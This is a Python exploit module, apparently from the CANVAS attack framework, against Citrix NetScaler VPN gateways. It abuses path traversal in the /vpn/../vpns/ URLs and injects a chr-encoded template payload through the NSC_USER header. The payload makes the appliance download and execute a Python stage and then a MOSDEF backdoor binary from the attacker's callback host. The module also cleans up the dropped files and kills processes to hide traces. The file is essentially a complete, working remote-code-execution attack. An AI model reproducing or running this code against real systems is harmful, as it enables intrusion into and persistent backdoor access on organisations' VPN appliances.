#!/usr/bin/env python

import os
import sys
import yaml
import copy
import logging

from time import sleep
from random import randint

if '.' not in sys.path:
    sys.path.append('.')

import canvasengine

from exploitutils import *
from tcpexploit import tcpexploit

from libs import spkproxy
from libs.canvasos import canvasos


module_path = os.path.dirname(os.path.realpath(__file__))
with open(module_path + os.path.sep + 'canvas.yaml', 'r') as f:
    metadata = yaml.safe_load(f.read())

NAME          = metadata['NAME']
DESCRIPTION   = metadata['DESCRIPTION']
VERSION       = metadata['VERSION']
DOCUMENTATION = metadata['DOCUMENTATION']
PROPERTY      = metadata['PROPERTY']


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.name       = NAME
        self.target     = ""
        self.port       = 443
        self.use_https  = True
        self.test_result= 0 # uninitialized | 1->Failed | 2->Succeeded
        self.server_p   = '' # Our HTTP Server (python payload)
        self.server_c   = '' # Our HTTP Server (mosdef payload)

        self.user       = randomstring(8)
        self.filename   = randomstring(8) + 'grep'
        self.nonce      = random.randint(1, 30)
        self.cback      = randomstring(8) + 'grep'

    def getargs(self):
        """
        Get arguments
        """
        self.host           = self.target.interface
        self.port           = int(self.argsDict.get('port', self.port))
        self.use_https      = self.argsDict.get("use_https", self.use_https)
        # self.getarg("path")

        if self.use_https:
            self.url = "https://%s:%s/vpn/../vpns/portal/scripts/newbm.pl" % (self.host, self.port)
        else:
            self.url = "http://%s:%s/vpn/../vpns/portal/scripts/newbm.pl" % (self.host, self.port)

        logging.debug("Using URL: %s" % self.url)

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def doPostAction(self, engine, new_node):
        logging.info("Performing post-action cleanup")

        cmd = 'rm -f /tmp/{}'.format(self.cback)
        new_node.shell.runcommand(cmd)

    def test(self):
        """
        Simple test to verify that targets are vulnerable
        """
        self.getargs()
        if not self.test_result:
            url = 'http://{}:{}/vpn/../vpns/NSWinRegistry.dll'.format(self.host, self.port)

            (res, response_code) = spkproxy.urlopen(url, exploit=self, entireresponse=False, return_response_code=True, verb="GET")

            if response_code == 200:
                logging.warning('Target appears to be vulnerable')
                self.test_result = 2
                return True
            elif response_code == 403:
                logging.critical('Target appears to be patched')
            else:
                logging.critical('Target does not appear to be a Citrix server')

            self.test_result = 1
            return False
        elif self.test_result == 1:
            return False
        else:
            return True

    def setup_webserver_python(self):
        data = """
import os
import subprocess
import requests

os.setsid()
url = "http://{}:{}"
callback = "/tmp/{}"
req = requests.get(url + "/mosdef")
f = open(callback, "w")
f.write(req.content)
f.close()
os.chmod(callback, 0755)
os.remove("/netscaler/portal/templates/{}.xml")
os.remove("/var/vpn/bookmark/{}.xml")
os.remove("/var/tmp/netscaler/portal/templates/{}.xml.ttc2")
os.remove("/tmp/grep")
os.popen("kill -9 $(ps aujwx | grep defunct | awk '{{print $12}}')")

subprocess.call([callback, "{}", "{}"])
        """.format(self.callback.ip, self.server_c.port, self.cback, self.filename, self.user, self.filename, self.callback.ip, self.callback.port)

        app = self.engine.getModuleExploit("httpserver")
        app.link(self)
        app.argsDict["singleexploit"] = "upload"
        app.argsDict["auto_port"] = True
        app.argsDict["sourcedata"] = data

        self.server_p = app
        return app.listen()

    def setup_webserver_callback(self):
        callback_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), '..', '..', '..', '..',
                                     'backdoors', 'mosdef_callbacks', 'mosdef_callback_fbsd9_i386')
        data = ''
        with open(callback_path, 'r') as f:
            data = f.read()

        app = self.engine.getModuleExploit("httpserver")
        app.link(self)
        app.argsDict["singleexploit"] = "upload"
        app.argsDict["auto_port"] = True
        app.argsDict["sourcedata"] = data

        self.server_c = app
        return app.listen()

    def upload_payload(self):
        logging.info("Uploading payload")
        encoded = ""
        payload = ("""/var/python/bin/python -c 'import os,subprocess,requests;req=requests.get("http://{}:{}/grep");a=open("/tmp/grep","w");a.write(req.content);a.close();p=subprocess.Popen(["/var/python/bin/python", "/tmp/grep"]);'""".format(self.callback.ip, self.server_p.port))
        for i in range(len(payload)):
            encoded = encoded + "chr("+str(ord(payload[i]))+") . "
        encoded = encoded[:-3]

        title   = "[% template.new({'BLOCK'='print readpipe(" + encoded + ")'})%]"
        headers = []
        headers.append(('NSC_USER', '../../../netscaler/portal/templates/%s' % (self.filename)))
        headers.append(('NSC_NONCE', '%s' % (self.nonce)))
        data = (
            {
                "url"      : "127.0.0.1",
                "title"    : title,
                "desc"     : "desc",
                "UI_inuse" : "a"
            })

        (res, response_code) = spkproxy.urlopen(self.url,
                                                data=data,
                                                verb='POST',
                                                exploit=self,
                                                extraheaders=headers,
                                                noresponse=False,
                                                entireresponse=True,
                                                return_response_code=True)

        if response_code == 403:
            logging.error("Error")
            return False

        if (".ns_reload()") in str(res.getvalue()):
            logging.info("Payload uploaded")

        return True

    def trigger_payload(self):
        logging.info("Triggering payload execution, may take a while...")
        headers = []
        headers.append(('NSC_USER', '%s' % (self.user)))
        headers.append(('NSC_NONCE', '%s' % (self.nonce)))

        if self.use_https:
            url = "https://%s:%s/vpn/../vpns/portal/%s.xml" % (self.host, self.port, self.filename)
        else:
            url = "http://%s:%s/vpn/../vpns/portal/%s.xml" % (self.host, self.port, self.filename)

        (res, response_code) = spkproxy.urlopen(url, exploit=self, extraheaders=headers, entireresponse=False, return_response_code=True, verb="GET")
        if response_code == 200:
            logging.info("Payload triggered correctly")

    def run(self):
        self.setProgress(0)
        if self.test():
            self.setProgress(10)

            cb = self.setup_webserver_callback()
            if not cb:
                logging.error("Error while setting up webserver for callback")
                return False
            pt = self.setup_webserver_python()
            if not pt:
                logging.error("Error while setting up webserver for python payload")
                return False

            logging.info("WebServers up")
            self.setProgress(20)

            if not self.upload_payload():
                return False

            self.setProgress(50)

            sleep(1)
            self.trigger_payload()

            self.setProgress(80)

            logging.warning('Double check that these files have been correctly removed')
            logging.warning('/netscaler/portal/templates/%s.xml' % self.filename)
            logging.warning('/var/tmp/netscaler/portal/templates/%s.xml.ttc2' % self.filename)
            logging.warning('/var/vpn/bookmark/%s.xml' % self.filename)
            logging.warning('/tmp/grep')
            logging.warning('/tmp/%s' % self.cback)

            got_connection = False
            while self.server_p.accept():
                got_connection = True

            if got_connection:
                logging.info("Python payload downloaded")
                self.setProgress(100)
                self.setInfo("%s Done (Success)" % (self.name))
            else:
                logging.error("Error on the python payload download phase")
                self.setInfo("%s Done (Failed)" % (self.name))
                self.setProgress(-1)

                return False

            got_connection = False
            while self.server_c.accept():
                got_connection = True

            if got_connection:
                logging.info("MOSDEF callback downloaded")
                self.setProgress(100)
                self.setInfo("%s Done (Success)" % (self.name))
            else:
                logging.error("Error on the MOSDEF callback download phase")
                self.setInfo("%s Done (Failed)" % (self.name))
                self.setProgress(-1)

                return False

        return True


if __name__ == '__main__':
    logging.info('Running CANVAS %s Exploit v%s' % (DESCRIPTION, VERSION))
    app = theexploit()
    try:
        ret = standard_callback_commandline(app)
    except KeyboardInterrupt:
        pass
    if ret not in [0, 1, None] and hasattr(ret, 'interact'):
        ret.interact()
